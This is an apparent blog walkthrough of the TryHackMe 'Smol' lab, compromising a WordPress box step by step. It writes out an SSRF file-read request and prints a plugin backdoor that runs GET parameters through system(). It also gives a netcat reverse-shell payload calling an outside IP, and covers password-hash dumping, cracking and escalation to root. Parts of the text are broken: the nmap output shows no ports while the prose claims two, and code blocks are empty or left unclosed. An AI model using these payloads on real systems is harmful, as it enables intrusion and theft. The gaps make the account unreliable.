Hey everyone! Today, I'm diving into the [Smol](https://tryhackme.com/room/smol) room on TryHackMe. As the name suggests, it's a small box, but it's packed with fun challenges. Let's fire up our terminals and see what we can find.

First things first, let's set our target IP as an environment variable to make our lives easier.

```bash
export IP=10.10.108.1
```

---

## üïµÔ∏è‚Äç‚ôÇÔ∏è Phase 1: Reconnaissance

Time for our trusty sidekick, `nmap`, to do its thing. We'll run a full port scan with script and version detection to get a good look at the target.

```bash
‚ùØ nmap -T4 -n -sC -sV -Pn -p- $IP
Starting Nmap 7.97 ( https://nmap.org ) at 2025-07-04 14:33 +0300
Nmap scan report for 10.10.108.1
Host is up (0.072s latency).

PORT   STATE SERVICE VERSION

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.22 seconds
```

Our scan reveals two open ports: SSH (22) and HTTP (80). The HTTP title gives us a crucial clue: `Did not follow redirect to http://www.smol.thm`. This means we need to update our `/etc/hosts` file to resolve this domain name to the machine's IP address.

Let's point our browser to `http://www.smol.thm` and see what we get.

A wild WordPress site appears! Before we start poking around the admin panel, let's do some directory fuzzing with `gobuster` to map out the site's structure.

```bash

Jackpot! `wpscan` found an interesting plugin: `jsmol2wp`, last updated in 2018. An old plugin is like a "kick me" sign for hackers. A quick search reveals it's vulnerable to a classic **Server-Side Request Forgery (SSRF)**.

üîó **Vulnerability Link:** <https://wpscan.com/vulnerability/ad01dad9-12ff-404f-8718-9ebbd67bf611/>

SSRF lets us trick the server into making requests on our behalf. We can use this to read local files. Let's aim for the holy grail of WordPress configuration: `wp-config.php`.

```bash
‚ùØ curl 'http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php'

define( 'WP_DEBUG', false );

if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
```

Success! We've got the database username (`wpuser`) and password. With these credentials, we can now log into the WordPress admin dashboard at `/wp-admin`.

We're in!

## üêö Phase 2: Initial Foothold

My first thought was to get a reverse shell by editing a theme or plugin file, but the permissions were locked down tight. Time to enumerate more from within the admin panel. A post titled "private webmaster tasks" catches my eye.

![Desktop View](/assets/img/2025-07-04-TryHackMe-Smol/photo3.webp){: width="929" height="953" }

The post mentions that the `Hello Dolly` plugin might have a backdoor. That's... suspicious. Let's use our SSRF vulnerability again to read the source code of `hello.php`.

```bash
‚ùØ curl 'http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-content/plugins/hello.php'

<?php
/**
 * @package Hello_Dolly
 * @version 1.7.2
 */
/*
Plugin Name: Hello Dolly
Plugin URI: http://wordpress.org/plugins/hello-dolly/
Description: This is not just a plugin, it symbolizes the hope and enthusiasm of an entire generation summed up in two words sung most famously by Louis Armstrong: Hello, Dolly. When activated you will randomly see a lyric from <cite>Hello, Dolly</cite> in the upper right of your admin screen on every page.
Author: Matt Mullenweg
Version: 1.7.2
Author URI: http://ma.tt/
*/

function hello_dolly_get_lyric() {
	/** These are the lyrics to Hello Dolly */
	$lyrics = "Hello, Dolly
Well, hello, Dolly
It's so nice to have you back where you belong
You're lookin' swell, Dolly
I can tell, Dolly
You're still glowin', you're still crowin'
You're still goin' strong
I feel the room swayin'
While the band's playin'
One of our old favorite songs from way back when
So, take her wrap, fellas
Dolly, never go away again
Hello, Dolly
Well, hello, Dolly
It's so nice to have you back where you belong
You're lookin' swell, Dolly
I can tell, Dolly
You're still glowin', you're still crowin'
You're still goin' strong
I feel the room swayin'
While the band's playin'
One of our old favorite songs from way back when
So, golly, gee, fellas
Have a little faith in me, fellas
Dolly, never go away
Promise, you'll never go away
Dolly'll never go away again";

	// Here we split it into lines.
	$lyrics = explode( "\n", $lyrics );

	// And then randomly choose a line.
	return wptexturize( $lyrics[ mt_rand( 0, count( $lyrics ) - 1 ) ] );
}

// This just echoes the chosen line, we'll position it later.
function hello_dolly() {
	eval(base64_decode('CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA='));

	$chosen = hello_dolly_get_lyric();
	$lang   = '';
	if ( 'en_' !== substr( get_user_locale(), 0, 3 ) ) {
		$lang = ' lang="en"';
	}

	printf(
		'<p id="dolly"><span class="screen-reader-text">%s </span><span dir="ltr"%s>%s</span></p>',
		__( 'Quote from Hello Dolly song, by Jerry Herman:' ),
		$lang,
		$chosen
	);
}

// Now we set that function up to execute when the admin_notices action is called.
add_action( 'admin_notices', 'hello_dolly' );

// We need some CSS to position the paragraph.
function dolly_css() {
	echo "
	<style type='text/css'>
	#dolly {
		float: right;
		padding: 5px 10px;
		margin: 0;
		font-size: 12px;
		line-height: 1.6666;
	}
	.rtl #dolly {
		float: left;
	}
	.block-editor-page #dolly {
		display: none;
	}
	@media screen and (max-width: 782px) {
		#dolly,
		.rtl #dolly {
			float: none;
			padding-left: 0;
			padding-right: 0;
		}
	}
	</style>
	";
}

add_action( 'admin_head', 'dolly_css' );
```

Aha! Tucked inside the `hello_dolly()` function is this highly suspicious line. Using `eval()` on a base64 encoded string is the digital equivalent of wearing a trench coat indoors. Let's decode it.

```php
eval(base64_decode('CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA='));
```

```bash
‚ùØ echo 'CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA=' | base64 -d

 if (isset($_GET["\143\155\x64"])) { system($_GET["\143\x6d\144"]); } %
```

The decoded string is still obfuscated with octal and hex codes. Let's decode those variable names.

```bash
‚ùØ php -r 'echo "\143\155\x64" . ":" . "\143\x6d\144";'
cmd:cmd
```

As suspected, it's a simple command execution backdoor! It checks for a GET parameter named `cmd` and executes its value using `system()`. How convenient!

The `hello_dolly` function is hooked to `admin_notices`, which means it runs on any page in the admin dashboard.

![Desktop View](/assets/img/2025-07-04-TryHackMe-Smol/photo4.webp){: width="562" height="109" }

This is our entry point! We can simply browse to an admin page (like `/wp-admin/index.php`) and append our `cmd` parameter with a reverse shell payload.

First, let's grab a BASH reverse shell payload from [RevShells](https://www.revshells.com/). Then, we'll URL-encode it and add it to the URL.

**Important:** Using `curl` from the command line won't work because we need an authenticated session. The easiest way is to paste the final URL directly into your browser while you're logged into the WordPress admin panel.

```bash
# Set up a listener on your machine
nc -lvnp 4444

# Paste this URL into your browser (after logging in)
# Make sure to replace the IP and Port with your own!
curl 'http://www.smol.thm/wp-admin/index.php/?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.21.206.128%204444%20%3E%2Ftmp%2Ff'
```

And we should get a shell! Let's upgrade it to a fully interactive TTY.

```bash
# Upgrade the shell for a better experience
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm-256color
# Press CTRL+Z to background the shell
stty raw -echo;fg
reset
```

We are now logged in as `www-data`. Time to escalate our privileges.

---

## üöÄ Phase 3: Privilege Escalation

Let's start by looking around the system as the `www-data` user.

```bash
www-data@smol:/home$ ls -la
total 24
drwxr-xr-x  6 root  root     4096 Aug 16  2023 .
drwxr-xr-x 18 root  root     4096 Mar 29  2024 ..
drwxr-x---  2 diego internal 4096 Aug 18  2023 diego
drwxr-x---  2 gege  internal 4096 Aug 18  2023 gege
drwxr-x---  5 think internal 4096 Jan 12  2024 think
drwxr-x---  2 xavi  internal 4096 Aug 18  2023 xavi
```

We see a few user directories, but we can't access them because we're not in the `internal` group. Let's check the groups on the system.

```bash
www-data@smol:/home$ cat /etc/group
...
dev:x:1004:think,gege
internal:x:1005:diego,gege,think,xavi
...
```

The `internal` and `dev` groups look interesting. I ran `linpeas.sh` and it pointed out a potential Polkit vulnerability (CVE-2021-3560), but the exploit script didn't work. Time for another approach.

Since we have the password for the `wpuser` database account, let's connect to the MySQL database and see what we can find.

```bash
www-data@smol:/tmp$ mysql -u wpuser -p'******************' -D wordpress
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 419
Server version: 8.0.36-0ubuntu0.20.04.1 (Ubuntu)

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```

The `wp_users` table is always a goldmine.

```sql
mysql> select user_login, user_pass from wp_users;
+------------+------------------------------------+
| user_login | user_pass                          |
+------------+------------------------------------+
| admin      | $P$BH.CF15fzRj4li7nR19CHzZhPmhKdX. |
| wpuser     | $P$BfZjtJpXL9gBwzNjLMTnTvBVh2Z1/E. |
| think      | $P$BOb8/koi4nrmSPW85f5KzM5M/k2n0d/ |
| gege       | $P$B1UHruCd/9bGD.TtVZULlxFrTsb3PX1 |
| diego      | $P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1 |
| xavi       | $P$BB4zz2JEnM2H3WE2RHs3q18.1pvcql1 |
+------------+------------------------------------+
6 rows in set (0.00 sec)

```

We've got password hashes for all the users! These are phpass (WordPress MD5) hashes, which `hashcat` can handle with mode `400`. Let's save them to a file and crack them with `rockyou.txt`.

```text

`hashcat` makes short work of it and cracks `diego`'s password in seconds. Let's switch users.

```bash
www-data@smol:/tmp$ su diego
Password: <cracked_password>
diego@smol:/tmp$ cd ~
diego@smol:~$ ls
user.txt
diego@smol:~$ cat user.txt
*********************************
```

User flag captured! Now let's continue our journey to root.

### Hopping from Diego to Think

Let's check out the other user directories. In `/home/think/.ssh`, we find a private key. It seems `think` was a bit careless with file permissions, and we can read it!

```bash
diego@smol:/home/think/.ssh$ ls -al
total 20
drwxr-xr-x 2 think think    4096 Jun 21  2023 .
drwxr-x--- 5 think internal 4096 Jan 12  2024 ..
-rwxr-xr-x 1 think think     572 Jun 21  2023 authorized_keys
-rwxr-xr-x 1 think think    2602 Jun 21  2023 id_rsa
-rwxr-xr-x 1 think think     572 Jun 21  2023 id_rsa.pub
```

Let's copy the `id_rsa` key to our machine, set the correct permissions, and SSH in as `think`.

```bash
‚ùØ chmod 400 think.ssh
‚ùØ ssh think@$IP -i think.ssh
think@smol:~$
```

We're in as `think`. On to the next hop!

### Hopping from Think to Gege

This is where things get a little strange. I tried to `su` to `gege` on a whim, and...

```bash
think@smol:~$ su gege
gege@smol:/home/think$
```

It worked! No password needed. There must be a strange authorization rule at play. I'm not complaining, though!

### Hopping from Gege to Xavi

In `gege`'s home directory, there's a tantalizing `wordpress.old.zip`. A backup! But of course, it's password-protected. Nothing a little `zip2john` and `john` can't handle. Let's get the file to our local machine to crack it.

```bash
# On the target machine (as gege)
gege@smol:~$ python3 -m http.server 8080

# On our local machine
‚ùØ wget http://$IP:8080/wordpress.old.zip
‚ùØ zip2john wordpress.old.zip > zip.hash
‚ùØ john --wordlist=rockyou.txt zip.hash
...
**********@hotmail.com (wordpress.old.zip)
...
```

With the password cracked, we can unzip the file and inspect the old `wp-config.php`.

```bash
gege@smol:~$ unzip wordpress.old.zip
Archive:  wordpress.old.zip
   creating: wordpress.old/
[wordpress.old.zip] wordpress.old/wp-config.php password: <cracked_password>
...
gege@smol:~/wordpress.old$ cat wp-config.php
...
/** Database username */
define( 'DB_USER', 'xavi' );

/** Database password */
define( 'DB_PASSWORD', '*************' );
...
```

And what do we find? Credentials for the user `xavi`!

### Hopping from Xavi to Root

Let's switch to our new user, `xavi`, and see what privileges we have. A quick `sudo -l` reveals the ultimate prize.

```bash
gege@smol:~/wordpress.old$ su xavi
Password: <xavi's_password_from_config>
xavi@smol:/home/gege/wordpress.old$ sudo -l
[sudo] password for xavi:
Matching Defaults entries for xavi on smol:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User xavi may run the following commands on smol:
    (ALL : ALL) ALL
```

We have `(ALL : ALL) ALL`! We've hit the jackpot.

```bash
xavi@smol:/home/gege/wordpress.old$ sudo su
root@smol:/home/gege/wordpress.old$ cd /root
root@smol:~# cat root.txt
****************************
```

And we are root! Room pwned. Thanks for reading!
